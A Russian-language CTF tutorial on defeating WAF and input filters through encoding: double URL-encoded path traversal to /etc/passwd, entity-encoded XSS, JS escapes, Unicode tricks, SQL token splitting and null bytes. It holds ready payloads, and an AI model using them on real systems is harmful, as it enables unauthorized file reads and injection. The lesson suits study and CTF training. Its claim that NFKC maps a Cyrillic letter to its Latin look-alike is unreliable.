## Вопрос, с которого всё начинается

Ты нашёл path traversal: параметр `file` читает файл по имени, и `../../etc/passwd` должен вывести пароли. Отправляешь — сервер отвечает «blocked». Пробуешь закодировать точку и слэш — снова «blocked». Кажется, фильтр непробиваем. Но именно здесь и живёт целый класс misc-задач: **кодировки**. Один и тот же символ можно записать десятком способов, и если проверка и использование декодируют по-разному — фильтр обходится.

Разберём обход на этой задаче.

## Наш пример: чтение файла с фильтром на `../`

Эндпоинт `/read?file=...` читает файл. Проверяем наивный ввод:

```
$ curl -s 'http://chal.ctf/read?file=../../etc/passwd'
blocked
```

Фильтр ищет подстроку `../`. Нужно представить её так, чтобы фильтр не увидел, а файловая система — поняла.

## Шаг 1: как устроено URL-кодирование

**URL-encoding** записывает байт как `%XX` — знак процента и два hex-числа. `%2F` — это `/`, `%2E` — `.`, `%20` — пробел. Кодируем наш путь:

```python
import urllib.parse
payload = '../../etc/passwd'
for n in range(1, 4):
    payload = urllib.parse.quote(payload, safe='')
    print(n, payload)
```

```
1 ..%2F..%2Fetc%2Fpasswd
2 ..%252F..%252Fetc%252Fpasswd
3 ..%25252F..%25252Fetc%25252Fpasswd
```

Каждое `quote` кодирует знак `%` в `%25` — поэтому уровни наслаиваются. Сервер декодирует URL-путь **до** сравнения: `..%2F..%2Fetc%2Fpasswd` после декодирования снова даёт `../../etc/passwd`, и фильтр его ловит.

## Шаг 2: WAF декодирует один раз — двойное кодирование

Ключевая мысль: разные слои декодируют **разное число раз**. Смоделируем конвейер: WAF (защита) декодирует один раз и ищет `../`; бэкенд декодирует дважды (слой сервера + слой фреймворка):

```python
import urllib.parse
def waf(raw):
    return "BLOCKED" if '../' in urllib.parse.unquote(raw) else "pass"
def backend(raw):
    d = urllib.parse.unquote(raw)     # первый декод
    d = urllib.parse.unquote(d)       # второй декод
    return "/etc/passwd" if d.endswith('etc/passwd') else d

for raw in ['../../etc/passwd', '..%2f..%2fetc%2fpasswd', '..%252f..%252fetc%252fpasswd']:
    print(f"{raw:35s} WAF={waf(raw):8s} backend={backend(raw)}")
```

```
../../etc/passwd                    WAF=BLOCKED  backend=/etc/passwd
..%2f..%2fetc%2fpasswd              WAF=BLOCKED  backend=/etc/passwd
..%252f..%252fetc%252fpasswd        WAF=pass     backend=/etc/passwd
```

Сработало **двойное кодирование**: `%252f` после первого декода становится `%2f` — WAF видит `%2f`, а не `/`, и пропускает. Бэкенд декодирует ещё раз и получает настоящий `/`. Так рождается обход.

## Шаг 3: HTML-entities — кодирование для браузера, не для сервера

В HTML символы пишут как сущности: `&amp;`, `&#65;` (это `A`), `&#x41;` (тоже `A`). Их декодирует **браузер**, а не сервер. Поэтому для XSS это отдельный слой:

```python
import html
print(html.unescape('&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;'))
```
```
<script>alert(1)</script>
```

Если фильтр проверяет «сырой» ввод, а браузер декодирует сущности при рендеринге — XSS проходит. Запомни: **entities — клиентский слой, URL-encoding — серверный**. Путать их — классическая ошибка.

## Шаг 4: JS-escape и base64

В JavaScript строку можно записать через `\x41` или `\u0041` — оба дают `A`. Это обходит фильтры, ищущие буквальные символы:

```javascript
\u0061lert(1)          // alert(1)
String.fromCharCode(97,108,101,114,116)
```

**Base64** встречается в data-URI, cookie и JWT. Помни про варианты: base64url (`-` и `_` вместо `+` и `/`), отсутствие padding и двойной base64. В задачах проверяй длину (кратна 4) и алфавит.

## Шаг 5: юникод-нормализация и гомоглифы

Один символ можно представить разными код-пойнтами, и после нормализации (NFC/NFKC) они становятся одинаковыми. Это ломает фильтры: строка с кириллической `а` визуально равна латинской `admin`, но байтово — нет.

```python
import unicodedata
s1 = "admin"                       # латиница
s2 = "аdmin"                       # первая буква — кириллическая
print(s1 == s2)                    # False
print(unicodedata.normalize('NFKC', s2) == s1)
```

Рядом — **гомоглифы** (визуально похожие символы), **zero-width** (`\u200b`), **RTL-override** (`\u202e`) для «переворота» текста. Если проверка не нормализует вход, а использование нормализует — фильтр обходится.

## Шаг 6: конвейер «приём → декодирование → проверка → использование»

В основе всех обходов — понятие **канонизации**: приведения входа к единственному «нормальному» виду перед проверкой. Если канонизация неполная или порядок операций неверен, между проверкой и использованием появляется зазор. Нарисуй конвейер и отметь, какие преобразования делает каждый слой: WAF, nginx/Apache, фреймворк, файловая система. То, что проходит фильтр, показывает уровень декодирования:

```
..            → ../             (baseline)
%2e%2e        → ../             (один декод)
%252e%252e    → ../             (два декода)
```

## Шаг 7: нестандартные пробелы, регистр и разрыв токенов

Кодирование — не единственный способ обойти фильтр. Часто помогают другие «формы» того же символа:

- **пробел** — `%20`, `+`, `%09` (таб), `${IFS}` в shell-контексте;
- **регистр** — `SeLeCt` вместо `SELECT` для фильтров без флага `i`;
- **разрыв токена** — `SEL/**/ECT` в SQL, `<scr<script>ipt>` для наивной замены;
- **null-byte** — `%00` обрезает строку в C-функциях;
- **альтернативные функции** — `confirm`/`prompt` вместо `alert`.

Например, фильтр, удаляющий подстроку `<script>`, обходится вложенностью: `<scr<script>ipt>` — после удаления внутреннего тега остаётся `<script>`. Всегда думай, **что именно** видит фильтр и **что** — интерпретатор в конце конвейера.

## Что мы теперь знаем

- **URL-encoding** (`%XX`) и **двойное кодирование** (`%252F`) обходят фильтры, декодирующие один раз.
- **HTML-entities** декодирует браузер (клиент), а не сервер — это разные слои.
- **JS-escape** (`\x41`, `\u0041`) и **base64** прячут символы от фильтров.
- **Юникод-нормализация** и **гомоглифы** ломают проверки, не нормализующие вход.
- Всё держится на **канонизации**: расхождение «проверка vs использование» и есть дыра.

## Справочник: кодировки и где их декодируют

Каждый слой приложения декодирует своё. Обход строится на разнице «кто когда декодирует»:

| Кодировка | Где декодируется | Пример |
|---|---|---|
| URL (`%XX`) | сервер, веб-фреймворк | `%2e%2e%2f` = `../` |
| HTML-entities | браузер | `&lt;` = `<` |
| JS-escape (`\x`, `\u`) | JS-движок | `\x2e` = `.` |
| base64 | приложение вручную | `Li4v` = `../` |
| Unicode-нормализация | разные слои | `／` (полноширинный слэш) |
| UTF-16/UTF-7 | редко, но байпасит фильтры | `\u002e` |

Ключевая идея: WAF декодирует **один раз**, а приложение — ещё раз. Отсюда двойное кодирование.

## Мини-практика: двойное кодирование на конкретном примере

Возьмём путь `../../etc/passwd` и закодируем его дважды:

```
$ python3 -c "
from urllib.parse import unquote
p='..%252f..%252fetc%252fpasswd'
print('once :', unquote(p))
print('twice:', unquote(unquote(p)))
"
once : ..%2f..%2fetc%2fpasswd
twice: ../../etc/passwd
```

WAF смотрит на строку, декодирует один раз и видит `..%2f..%2f...` — безобидно. Приложение декодирует второй раз и получает `../../etc/passwd`. Это и есть байпас: **фильтр и приложение считают по-разному**.

## Частые ошибки

- **Декодировать один раз и успокоиться.** Проверяй двойное и тройное кодирование.
- **Путать слои.** HTML-entities обходит браузер, а не сервер; применяй их там, где нужно.
- **Игнорировать Unicode.** Полноширинные и похожие символы проходят текстовые фильтры.
- **Забыть про нормализацию.** Один и тот же символ может быть представлен разными байтами.

## Справочник: инструменты и быстрые проверки

Кодировки удобно проверять и генерировать командами:

| Задача | Команда |
|---|---|
| URL-декод | `python3 -c "from urllib.parse import unquote;print(unquote('..%2f'))"` |
| двойной декод | `unquote(unquote(p))` |
| base64 | `echo -n '../' | base64` |
| hex | `xxd -r -p` / `python3 -c "print(bytes.fromhex('2e2e'))"` |
| Unicode-нормализация | `python3 -c "import unicodedata;print(unicodedata.normalize('NFKC', '／'))"` |
| HTML-entity | `python3 -c "import html;print(html.unescape('&lt;'))"` |

Эти команды позволяют быстро проверить, что именно увидит фильтр и что — приложение.

## Шпаргалка: стратегия обхода фильтров

- Определи, **сколько раз** декодирует каждый слой.
- Попробуй двойное (`%25XX`) и тройное кодирование.
- Проверь альтернативные представления: Unicode, полноширинные символы, регистр.
- Разрывай токены (пробелы, комментарии, переносы).
- Помни: HTML-entities обходит **браузер**, а не сервер.

## Мини-практика: обход фильтра на конкретном примере

Пусть WAF блокирует подстроку `../`, а приложение декодирует URL. Пробуем варианты по возрастанию:

1. **Одинарное:** `..%2f` — WAF декодирует и видит `../` → блок.
2. **Двойное:** `..%252f` — WAF видит `..%2f`, приложение декодирует в `../` → проходит.
3. **Unicode:** `%ef%bc%8f` (полноширинный слэш) — фильтр не распознаёт как слэш.
4. **Смешанное:** `%2e%2e%2f` — точки и слэш закодированы отдельно.

Вывод: **байпас ищут по числу слоёв декодирования**, а не по словарю. Каждый слой — потенциальная разница между тем, что видит фильтр и что получает приложение.
